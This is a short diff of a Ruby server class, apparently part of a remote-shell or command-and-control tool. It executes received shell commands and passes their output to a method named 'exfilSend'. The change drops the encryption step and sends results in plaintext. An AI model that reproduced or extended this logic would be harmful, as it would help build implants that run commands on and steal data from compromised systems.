@@ -44,10 +44,8 @@ class Server
       result = @shell.executeCmd(str)
           puts "returend from executing shell"
       if result != nil
-        iv = dec.newIv
-        payload = dec.encrypt(iv,result)
-        conn.exfilSend(payload)
-        #conn.exfilSend(result)
+
+        conn.exfilSend(result)
       end
       str = ""
     end
